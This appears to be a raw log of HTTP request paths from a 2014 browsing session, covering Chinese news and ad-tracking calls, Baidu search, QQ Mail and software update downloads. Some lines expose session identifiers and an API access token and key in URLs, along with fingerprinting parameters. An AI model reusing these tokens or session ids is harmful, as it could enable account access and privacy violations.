+/ecom?di=959956&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=2&dri=0&dis=0&dai=8&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lcr=http://news.baidu.com/&ps=2881x1129&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3689&pis=-1x-1&cfv=15&ccd=24&chi=3&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=590&tlm=1417221926&tcn=1417221926&tpr=1417221925818&dpt=none&coa=&baidu_id=
+/ecom?di=959621&dcb=BAIDU_DUP_define&dtm=BAIDU_DUP2_SETJSONADSLOT&dbv=2&dci=0&dri=0&dis=0&dai=9&dds=&drs=1&dvi=1410832926&ltu=http://world.huanqiu.com/photo/2014-11/2754043_3.html&liu=&ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&lcr=http://news.baidu.com/&ps=3689x0&psr=1920x1080&par=1920x1032&pcs=1899x947&pss=1899x3689&pis=-1x-1&cfv=15&ccd=24&chi=3&cja=true&cpl=36&cmi=55&cce=true&col=zh-CN&cec=UTF-8&cdo=-1&tsr=593&tlm=1417221926&tcn=1417221926&tpr=1417221925818&dpt=none&coa=&baidu_id=
+/ex?i=mm_18021420_2310348_27460204&cb=jsonp_callback_71711&callback=&userid=&o=&f=&n=&re=1920x1080&r=http://world.huanqiu.com/photo/2014-11/2754043_2.html&cah=1032&caw=1920&ccd=24&ctz=8&chl=3&cja=1&cpl=36&cmm=55&cf=15.0&cg=a5886e29367061b6ebda1322c77d2e2e&pvid=a9d2f590798e68ad8dabb8c39d06e2e5&ai=0&ac=6731&prn=124482808&cas=prn&cbh=3689&cbw=1899&dx=1&u=http://world.huanqiu.com/photo/2014-11/2754043_3.html&k=&tt=Hello Kitty主题公园首落户中国 日卡通文化积极入华_国际新闻_环球网
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/ui?src=1000&k=Hello%20Kitty%E4%B8%BB%E9%A2%98%E5%85%AC%E5%9B%AD%E9%A6%96%E8%90%BD%E6%88%B7%E4%B8%AD%E5%9B%BD%20%E6%97%A5%E5%8D%A1%E9%80%9A%E6%96%87%E5%8C%96%E7%A7%AF%E6%9E%81%E5%85%A5%E5%8D%8E&iurl[]=http://himg2.huanqiu.com/attachment2010/2014/1129/20141129065328139.jpg&qid=sw8aw41417221926134&tu=1592628&width=800&height=533&opt=1&v=7&cached=0&pic=38&dri=1&callback=bd__cbs__trdl33
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.38818686082959175
+/u.gif?ts=9yt&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&xp=A5(b)AA2AAAC2&g=focustop-carousel&ep=.156,.467&ci=7&pp=1124,327&ps=1366,8282&u=none&txt=none
+/c.gif?t=5&p=2&q=&ra=0.20132701564580202
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.38818686082959175
+/gdt_stats.fcg?viewid0=K3mUsDHmgGMnbpz4Koss05Cjfktsi1E_Giww4J5aFjQRCBGSIRRyXV7BT3Ds7uJZMWSkOH23QZrK0OnfjFN0Qm7lUUPifLvjAWDYmM3th_dEl5xm1bFArZzQR3zsvcTKDVWdGw!Xtc_Mc18eHpBfpDcMzWsz1Aq!B6J8yt16vGX3cP2Q8IW!2UbPl6htXnKeN85t81lc6Ojy1KiGpZs_x9WEncObM5m4&viewid1=K3mUsDHmgGMnbpz4Koss04LfvxGGqu65iZFrLy_jbawRCBGSIRRyXV7BT3Ds7uJZMWSkOH23QZrK0OnfjFN0Qo0j3pj2Bf!pAWDYmM3th_dEl5xm1bFArZzQR3zsvcTKwFbqG1y09CL8utBE4aMyWTcMzWsz1Aq!B6J8yt16vGVWLp8KzIJrLkbPl6htXnKeN85t81lc6Ogy6ElRw8wzzYGHtrkvW60P&viewid2=K3mUsDHmgGMnbpz4Koss09E_PyT8kLdmowdNkVNiTIERCBGSIRRyXV7BT3Ds7uJZMWSkOH23QZrK0OnfjFN0Qn138kqsL7O4AWDYmM3th_dEl5xm1bFArZzQR3zsvcTK7w1i7_Vt_SI5ZtL!AS5WoTcMzWsz1Aq!B6J8yt16vGUMrBYP2kEFs0bPl6htXnKeN85t81lc6Og0_05SJrB74Wek7Plu07py&count=3
+/ex?i=mm_18021420_2310348_27472111
+/getnum?url=http://world.huanqiu.com/photo/2014-11/2754043_3.html&callback=bdShare.fn._getShare&type=load&t=1417221926466
+/dsp?pid=mm_18021420_2310348_27460204&bid=0a67f52a0000547917112b860092f274&nid=29628860&tanxssp_t=59853
+/t/tanxssp.js
+/public03/imageplus/sticker/html_3_with_delay.app.js?cacheTime=393673
+/cgi-bin/mail_list?sid=L-BqX-DmjhlgCT9r&s=search&folderid=all&page=0&subject=���繥������&sender=���繥������&receiver=���繥������&searchmode=&topmails=0&advancesearch=0&loc=frame_html,,,6
+/s?type=8&r=15&impid=qlcCDA770E-=&cid=27383013&size=300x250&mv_ref=http://world.huanqiu.com/photo/2014-11/2754043_3.html&tanxclick=http://click.tanx.com/ct?tanx_k=173&tanx_e=m7FK0s%2fMITCq6y7JtFcQMv3RLKUDEF0h3G1%2frg2oH7zZENIgpUBdXhRh7JxgWaRQwFRTYOORAHvZv8y%2bB1m%2bt6X3H9h77tFFkiiXxTvR%2fMmb1kKMfZeIcY1cPsknYPvRUT5VE%2f9ofct7nkeuOPCFpKdm734%2fiGn7IShrRZUn%2b9I%3d&tanx_u=
+/s?type=1&r=15&cus=26003_514355_5760830_27383013&impid=qlcCDA770E-=&tid=Vnlza2NWbm5pRUE9&finfo=DAABCAABAAAABAgAAgAAAGsEAAM/AX++ptdYQAAIAAIAAAADCgADYfemGcJaS/wIAAQAAABrBgAGOPUIAAgAATiAAA&mv_ref=http://world.huanqiu.com/photo/2014-11/2754043_3.html&price=AQpn9SoAAFR5FxErhgCS8nRFW6cVnJP9pQ==
+/adx.php?c=cz0yZWMzYjcxZTk1NDkxMjQ1AHQ9MTQxNzIyMTkwNQBzZT01AGJ1PTQAcHJpY2U9VkhrWEVRQU01aXQ3akVwZ1c1SUE4b3NfN1ZmVkU4d3U1Z0p0ZlEAY2htZD0xAGJkaWQ9NDc3OTA2NDU2QzAwQkE4MzI0MTYwQjVERDJFN0JGMjQAY3Byb2lkPTQ3NzkwNjQ1NkMwMEJBODMyNDE2MEI1REQyRTdCRjI0AHY9MQBpPWNmMGMyZGQ4
+/ex?i=mm_18021420_2310348_27472111&cb=jsonp_callback_21777&callback=&userid=&o=&f=&n=&re=1920x1080&r=http://world.huanqiu.com/photo/2014-11/2754043_2.html&cah=1032&caw=1920&ccd=24&ctz=8&chl=3&cja=1&cpl=36&cmm=55&cf=15.0&cg=a0d3896bf165b8078e4f3d6f98887984&pvid=a9d2f590798e68ad8dabb8c39d06e2e5&ai=0&ac=9789&pro=124481566&cas=pro&cbh=3635&cbw=1899&dx=1&u=http://world.huanqiu.com/photo/2014-11/2754043_3.html&k=&tt=Hello Kitty主题公园首落户中国 日卡通文化积极入华_国际新闻_环球网
+/v.gif?pid=307&type=3071&sc=624,243,1920,1032&desturl=http://world.huanqiu.com/photo/2014-11/2754043_3.html&apitype=1&linkid=i329ccmq6sa&velo_load=15&velo_cssload=2&velo_jsLoad=15&cite_uid=&cite_type=1&cite_mini=0
+/public03/imageplus/v2/dock/close.png
+/eye.php?t=00000000000000000000000000000000w6000K30000tj0BJa6000DRiiuRXVtn8DwI4N000000.mLFW5HD3PWbL0A-Vu1YknHnYPHRkP1f1njbYrHD3njR1P0KW5HfLP1bsPWfdPbnsnDFKrjnzPjDvnDcdwDfzwHIawWcY0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPHbzPWc3FHcvnf0&start=1417221926052&site_api_loaded=1417221926133&opt=1&v=7&found=1417221926135&loading=1417221926138&loaded=1417221926663&render_loaded=1417221926865&ad_count=1&pg_rect=248_0_1899_947&img_rect=313_549_800_533&showed=1417221926897&render=http://ecma.bdimg.com/public03/imageplus/sticker/html_3_with_delay.app.js&union_id=1592628&actionid=8
+/eye.php?t=00000000000000000000000000000000w6000K30000tj0BJa6000DRiiuRXVtn8DwI4N000000.mLFW5HD3PWbL0A-Vu1YknHnYPHRkP1f1njbYrHD3njR1P0KW5HfLP1bsPWfdPbnsnDFKrjnzPjDvnDcdwDfzwHIawWcY0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPHbzPWc3FHcvnf0&actionid=4&attach=0&time=1417221926897
+/poll?r=0.8294924604706466&u=915910623&s=7&k=tslONqY336_XNnSx&t=0&i=30&r=0.586483129998669
+/eye.php?t=00000000000000000000000000000000w6000K30000tj0BJa6000DRiiuRXVtn8DwI4N000000.mLFW5HD3PWbL0A-Vu1YknHnYPHRkP1f1njbYrHD3njR1P0KW5HfLP1bsPWfdPbnsnDFKrjnzPjDvnDcdwDfzwHIawWcY0ZNzUjY0TZcq0Ad-TWY0mgwYmyPC5HDsnj0-nWmkPHbzPWc3FHcvnf0&actionid=1&attach=0&time=1417221926935
+/public03/imageplus/tip-back.png
+/dsp?pid=mm_18021420_2310348_27472111&bid=0a67f52b000054791712149c0008500a&nid=29628780&tanxssp_t=11074
+/js/mvf_dsp.js
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/dsp_v3?v=2&i=0a67f52b000054791712149c0008500a&xid=zugacVlbfkA=&a=270&cid=1159395429071200820&wh=300x250&pid=mm_18021420_2310348_27472111&u=http://world.huanqiu.com/photo/2014-11/2754043_3.html&mtype=swf&zid=53402db79940c420ccc2fc2b68a8b036&r=1258795128&tanxclick=http://click.tanx.com/ct?tanx_k=193&tanx_e=fpW106RSjeCq6y7JtFcQMv3RLKUDEF0h3G1%2frg2oH7x57tJJVFIGsgUlXTDBOXGJxQMzLy6B%2bw4WSwkRy7GKfKX3H9h77tFFkiiXxTvR%2fMmb1kKMfZeIcZrXkb6yGEGRJkFFwLQRHzCnwuiFDFdUOhI1f6OkxImBVpI4TLrSdIMWf%2bB7kc5JvxpDZw73WxZ0&tanx_u=&_sig_=697c3253b70e2353b0c3b9caf3313b18
+/wnt?v=2&i=0a67f52b000054791712149c0008500a&xid=zugacVlbfkA=&a=270&campid=1159395429071192678&adgid=1159395429071193208&cid=1159395429071200820&tpid=1159395429071192065&drid=0&wh=300x250&pid=mm_18021420_2310348_27472111&u=http://world.huanqiu.com/photo/2014-11/2754043_3.html&r=3007889573&w=AQpn9SsAAFR5FxIUnAAIUAqS8ckDSM8vDQ==&_sig_=16f437e24f46f5d77c64b85c1f3c3a70
+/information/rank
+/galileo/20141016/8e2c040f6eb3c40a8a88137510e1ee04.gif
+/bjjs/dsp/v1.png
+/bjjs/dsp/mediav1.png
+/zh_CN/htmledition/images/skin_26/top_bg_list104473.gif
+/imp/i3?p=23&mk=8bKGr4obF8fyZZmm2hpL5TUPo06Jwufw0zcmrVJKTxgs5WGauPTFYV0A2Pawods9gEqfvFEuAGgecn1TNS5CUbUFdsjIvVGKkcrTNewM4wtmTdPaJo1_W3u8tUq-C_A1KAiDpm5l6oeYsgByppIMsFQoWlAUt1qXf7OAB0BuFP9IIgDnHZNESPmJazI8lNnbUV4Z3yi2jc0onAKS9SuNQz8eEMWmLCPSokOUQWVZJlNazCLJbfTUpxDQHMQZkce4Zfx1Jr4XWxkAGkeyETMUEqHiz9IlJCw1-g8NkjitJZWRf5xlHGSjAgVPSZlE0A8IuM5rcu4oW7DiZ6wsUdYF9A&t=2
+/v3/static/scripts/zpda3_1.js
+/static/css/comm/rank.css
+/static/js/chart.min.js
+/wh/o.htm?ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html
+/wh/o.htm?ltr=http://world.huanqiu.com/photo/2014-11/2754043_2.html&cf=u
+/v3/static/scripts/tploader3_1.htm
+/v3/static/scripts/va3.swf
+/static/scripts/zampda_logo_1.gif
+/v3/static/scripts/static_1.htm
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&ep=[{x:441,y:327,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=1&rnd=1575483708&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/v3/merchant/1159396588712362112_d_300_250_073490798.swf
+/nova_fp.htm?br=2&fp=66251189D1EFBF0BF61A06AF8BF9CEE3&fp2=9B7424686B42ACA97C3178CB34E05DFD&ci=477906456C00BA8324160B5DD2E7BF24:FG=1&bi=477906456C00BA8324160B5DD2E7BF24:FG=1&im=0&wf=1&ct=344&_=1417221927917
+/fp.htm?br=2&fp=66251189D1EFBF0BF61A06AF8BF9CEE3&fp2=9B7424686B42ACA97C3178CB34E05DFD&ci=477906456C00BA8324160B5DD2E7BF24:FG=1&bi=477906456C00BA8324160B5DD2E7BF24:FG=1&im=0&wf=1&ct=358&_=1417221927949
+/statics/images/favicon1.ico
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.722517263609916
+/u.gif?ts=bd2&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&xp=A5(b)AA2AAAC2&g=focustop-carousel&ep=.156,.467&ci=8&pp=1124,327&ps=1366,8282&u=none&txt=none
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.722517263609916
+/c.gif?t=5&p=2&q=&ra=0.6332543666940182
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/a.js?ch=0&jk=b6ccccb585d1f8b3&n=hqcom_cpr&tu=u1364901&word=http://world.huanqiu.com/photo/2014-11/2754043_3.html&if=0&aw=0&ah=0&pt=2190&it=0&vt=0&csp=1920,1032&bcl=1899,947&pof=1899,3689&top=248&left=0&total=1&rdm=1417221928136
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&ep=[{x:441,y:327,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=1&rnd=1350907034&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/a.js?did=4&ch=0&jk=21aecfe8b89ff343&tn=text_default_960_90&n=hqcom_cpr&js=c&tu=959755&word=http://world.huanqiu.com/photo/2014-11/2754043_3.html&if=0&aw=960&ah=90&pt=2195&it=0&vt=0&csp=1920,1032&bcl=1899,947&pof=1899,3689&top=1827&left=469&total=5&rdm=1417221928160
+/a.js?did=5&ch=0&jk=4178918c52bead3e&tn=baiduCustSTagLinkUnit&n=hqcom_cpr&js=c&tu=959746&word=http://world.huanqiu.com/photo/2014-11/2754043_3.html&if=0&aw=960&ah=180&pt=2191&it=0&vt=0&csp=1920,1032&bcl=1899,947&pof=1899,3689&top=2643&left=469&total=5&rdm=1417221928161
+/a.js?did=6&ch=0&jk=11eecdff6d09510b&tn=baiduCustSTagLinkUnit&n=hqcom_cpr&js=c&tu=959623&word=http://world.huanqiu.com/photo/2014-11/2754043_3.html&if=0&aw=640&ah=60&pt=2187&it=0&vt=0&csp=1920,1032&bcl=1899,947&pof=1899,3689&top=2828&left=469&total=5&rdm=1417221928162
+/a.js?did=0&ch=0&jk=fc481e3e9ab729c2&tn=template_float_all_normal&n=hqcom_cpr&js=f&exp=60002&tu=undefined&word=http://world.huanqiu.com/photo/2014-11/2754043_3.html&if=0&aw=130&ah=360&pt=1921&it=1932&vt=1932&csp=1920,1032&bcl=1899,947&pof=1899,3689&top=398&left=1460&total=5&rdm=1417221928162
+/a.js?did=0&ch=0&jk=fc481e3e9ab729c2&tn=template_float_all_normal&n=hqcom_cpr&js=f&exp=60002&tu=undefined&word=http://world.huanqiu.com/photo/2014-11/2754043_3.html&if=0&aw=130&ah=360&pt=1918&it=1932&vt=1932&csp=1920,1032&bcl=1899,947&pof=1899,3689&top=398&left=309&total=5&rdm=1417221928163
+/v.gif?pid=307&type=3075&l=1256&t=0&s=1256&v=278&f=0&r=http://world.huanqiu.com/photo/2014-11/2754043_3.html&u=http://comment.huanqiu.com/commentiframe.html
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=2392,2392&et=3&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221910&nv=0&rnd=933576014&si=1fc983b4c305d209e7e05d96e713939f&st=4&su=http://world.huanqiu.com/photo/2014-11/2754043_2.html&v=1.0.70&lv=2
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.48921031202189624
+/u.gif?ts=bvp&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&xp=A5(b)AA2AAAC2&g=focustop-carousel&ep=.156,.467&ci=9&pp=1124,327&ps=1366,8282&u=none&txt=none
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.48921031202189624
+/c.gif?t=5&p=2&q=&ra=0.152293189894408
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&ep=[{x:441,y:327,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=1&rnd=1342804123&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.6587871173396707
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.6587871173396707
+/
+/
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.35296401917003095
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.35296401917003095
+/u.gif?ts=prj&sid=i329bpkv5s6&page=news-index&pid=241&p=133&hid=424&px=1920*1080&ver=5&xp=A6(b)AA2AAAC2&g=focustop-carousel&ep=.622,.467&ci=6&pp=1416,359&ps=1920,8316&u=none&txt=none
+/c.gif?t=5&p=2&q=&ra=0.22198698483407497
+/u.gif?ts=c1c&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&xp=A5(b)AA2AAAC2&g=focustop-carousel&ep=.156,.467&ci=10&pp=1124,327&ps=1366,8282&u=none&txt=none
+/hm.gif?cc=1&ck=1&cl=24-bit&ds=1920x1080&ep=[{x:456,y:359,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=15.0&ja=1&ln=zh-CN&lo=0&lt=1417221896&nv=1&rnd=1697892976&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=98012088_5_dg&ch=10&v=1.0.70&lv=2&tt=百度新闻搜索——全球最大的中文新闻平台
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/c.gif?t=5&p=2&q=&ra=0.40786818601191044
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&ep=[{x:441,y:327,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=1&rnd=778184641&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/Login/userpage
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.6834625038318336
+/v.gif?pid=107&url=javascript:void(0);&type=0&m=11&c=top&a=52&col=4&ct=1&pn=0&t=&ra=0.6834625038318336
+/cgi-bin/foxmailupdate?f=xml
+/c.gif?t=5&p=2&q=&ra=0.18417352647520602
+/Login/inner_announce
+/u.gif?ts=chd&sid=i329bobdaku&page=news-index&pid=241&p=133&hid=424&px=1366*768&ver=5&xp=A5(b)AA2AAAC2&g=focustop-carousel&ep=.156,.467&ci=11&pp=1124,327&ps=1366,8282&u=none&txt=none
+/Login
+/hm.gif?cc=1&ck=1&cl=32-bit&ds=1366x768&ep=[{x:441,y:327,t:a,u:javascript%3Avoid(0)%3B}]&et=2&fl=11.3&ja=1&ln=zh-CN&lo=0&lt=1417221895&nv=1&rnd=1410898462&si=e9e114d958ea263de46e080563e254c4&st=3&su=http://www.baidu.com/index.php?tn=site5566&v=1.0.70&lv=3&tt=百度新闻搜索——全球最大的中文新闻平台
+/d/msdownload/update/software/defu/2014/11/am_delta_b86fdd4ab29ef30bbb2ef6f44580891396bc5eb0.exe
+/cgi-bin/mail_list?sid=L-BqX-DmjhlgCT9r&folderid=6&folderkey=6&page=0&ver=178907.3&cachemod=maillist&cacheage=7200&r=
+/cgi-bin/getinvestigate?sid=L-BqX-DmjhlgCT9r
+/gdt_stats.fcg?viewid=_D8_t4K5I5MshpoTMhDZKuh9RCZu07OfLvs1s_igAvtuXwl3LiF9ppnzz91!O38MhDjE8atlQbT9j!EiQzTGGQLcmj2BeZbt_talzsOGSYznz1!L8VBU5_pHK04EDRhUzpKoouSJ!5KQVS_Nu6QQ!oQZc2diDLYQxt_FxzuYNQ65cAW!VgOnK9bL0GBaKOvgeUswPTvSWHwFVVjGBSpq1VdVCKjNlYkQ&i=1&datatype=jsonp&callback=_cb_gdtjson3
+/Login/inner_announce
+/
+/index.php?tn=98012088_5_dg&ch=10
+/api/?access_token=8bd4605019e3111a93c092ab7f13ec1b13ce695f&api_key=9ff857b2b2d001d5c17447613452beeb&api_sig=3647cb1051103006e6da900e5474ae23&call_id=1417221909.954286&limit=200&method=Library.getSongs&page=2
+/
+/zh_CN/htmledition/images/skin_26/top_bg_list104473.gif
+/welcome
+/Login/self_information
+/static/navplus/js/nav_load_67a94b27.js
+/static/message/js/mt_show_1.6.js
+/su?wd=&json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&cb=jQuery1102006119349366053939_1417221910217&_=1417221910218
+/gdt_stats.fcg?viewid=K3mUsDHmgGMnbpz4Koss0811F33xhouBv8OpoasZJfkRCBGSIRRyXV7BT3Ds7uJZMWSkOH23QZrK0OnfjFN0QnZFyiwGn5tQAWDYmM3th_dEl5xm1bFArZzQR3zsvcTKf5fWjoBXw2hpoAThFdco4zcMzWsz1Aq!B6J8yt16vGWx1oVoTbBx_UbPl6htXnKeN85t81lc6OheWxZBD5RSuSjsIWeqUr7e&i=1&datatype=jsonp&callback=_cb_gdtjson1
+/gdt_stats.fcg?viewid=2G40eJQY_IAnbpz4Koss0572!pzxgqhGrHtDfQTOhvPZJLbhRC5ug5PsfXDXpHRgB5iYxnEbvFDOv_v8dYbNPujTUqfPaOvRuwA4K!OqGuis84RSjGbDELAOwPy4siaF29uWqiWQVkKZ9QVRi7hD7zGEWSJ4XP9oQ6ghnmaiO2Fo3AaCmbCUiFAARSiSBWkmW_Tm4IRCOsbQFdlHJgL579LgtKmyWVEI&i=1&datatype=jsonp&callback=_cb_gdtjson2
+/gdt_stats.fcg?viewid=NJL8UuY_WK8nbpz4Koss0xDCH7KCJI4idENoCg958XkRCBGSIRRyXV7BT3Ds7uJZMWSkOH23QZo9pGhkwCHQ9csnaK4UOvP81I46YR4IZdtnwFOZpRKJytMEjNuAUABeIf1Lj!NASi2JXs0bw7fN9XKnZE580b6MNzqRXkf3ceQf9o78qkXa2ZujF5LmOTkwzkv35f5!AnHMd00GbkjFmg&i=1&datatype=jsonp&callback=_cb_gdtjson3
+/home/xman/data/superload?type=weather&_req_seqid=0xff8bd64500068ec3&asyn=1&t=1417221910624&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024
+/static/trealayer/js/trealayer_init_bafbc6d0.js
+/static/activity/js/activity_start_f7a2402b.js
+/home/xman/data/tipspluslist?_req_seqid=0xff8bd64500068ec3&asyn=1&t=1417221911097&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024
+/su?wd=&sugmode=2&json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&cb=jQuery1102006119349366053939_1417221910217&_=1417221910219
+/safe/msg.pack?pid=h_home&ver=4.7.0.4087&oem=h_home
+/v.gif?mod=superplus:weather&submod=weather_tpl&utype=&superver=superplus&portrait=43825443b5bccaa6401a&glogid=3302617179&type=2011&pid=315&version=PCHome&terminal=PC&qid=0xff8bd64500068ec3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&super_frm=&from_login=&from_reg=&query=&curcard=1&curcardtab=&_r=0.08260306110605597&m=superplus:weather_weatherShow&logactid=5000000000&showType=weatherMod
+/home/msg/data/personalcontent?num=8&_req_seqid=0xff8bd64500068ec3&asyn=1&t=1417221911156&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024
+/Login/inner_announce
+/home/xman/data/treasuretips?_req_seqid=0xff8bd64500068ec3&asyn=1&t=1417221911161&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024
+/v.gif?mod=tipsplus:start&submod=tips_start&utype=&superver=superplus&portrait=43825443b5bccaa6401a&glogid=3302617179&type=2011&pid=315&version=PCHome&terminal=PC&qid=0xff8bd64500068ec3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&super_frm=&from_login=&from_reg=&query=&curcard=1&curcardtab=&_r=0.3630099075380713&m=tipsplus:start_show&logactid=1400000000&showType=2001&url=&title=
+/sub/class1/server/ca
+/v.gif?mod=superplus:skeleton&submod=skeleton&utype=&superver=superplus&portrait=43825443b5bccaa6401a&glogid=3302617179&type=2011&pid=315&version=PCHome&terminal=PC&qid=0xff8bd64500068ec3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&super_frm=&from_login=&from_reg=&query=&curcard=1&curcardtab=&_r=0.8910562109667808&m=superplus:skeleton_modShow&logactid=1100000000&showTab=navplus&opType=refresh
+/v.gif?mod=superplus:skeleton&submod=skeleton&utype=&superver=superplus&portrait=43825443b5bccaa6401a&glogid=3302617179&type=2011&pid=315&version=PCHome&terminal=PC&qid=0xff8bd64500068ec3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&super_frm=&from_login=&from_reg=&query=&curcard=1&curcardtab=&_r=0.2424872824922204&m=superplus:skeleton_navShow&logactid=0100000000&showTab=nav&showType=refresh
+/su?wd=&sugmode=2&json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&cb=jQuery1102006119349366053939_1417221910217&_=1417221910220
+/360ap/360apexe_ffb1c2a0954546ea607f25ca8a049fa6_5.1.0.1050.cab
+/Login
+/img/pc.gif?_t=265
+/ps_default.gif?_t=1417221910274
+/ps_default.gif?_t=1417221910274
+/ps_default.gif?_t=1417221910274
+/ps_default.gif?_t=1417221910274
+/ps_default.gif?_t=1417221910274
+/ps_default.gif?_t=1417221910274
+/su?wd=c&json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&cb=jQuery1102006119349366053939_1417221910217&_=1417221910221
+/home/msg/data/personalcontent?callback=jQuery1102006119349366053939_1417221910222&num=8&_req_seqid=&sid=&_=1417221910223
+/s?ie=utf-8&newi=1&mod=11&isbd=1&isid=102D22C0B9E71876&wd=cy&rsv_spt=1&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=98012088_5_dg&rsv_sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&_ss=1&clist=&hsug=&csor=2&_cr1=18362
+/su?wd=cy&json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&cb=jQuery1102006119349366053939_1417221910217&_=1417221910224
+/s?ie=utf-8&newi=1&mod=11&isbd=1&isid=102D22C0B9E71876&wd=cyg&rsv_spt=1&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=98012088_5_dg&rsv_sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&_ss=1&clist=&hsug=&csor=3&_cr1=18466
+/su?wd=cyg&json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&cb=jQuery1102006119349366053939_1417221910217&_=1417221910225
+/su?wd=cygw&json=1&p=3&sid=1453_10194_10268_9476_10121_10209_10017_10178_9498_10219_10096_10007_10235_10257_9979_9024&req=2&cb=jQuery1102006119349366053939_1417221910217&_=1417221910226
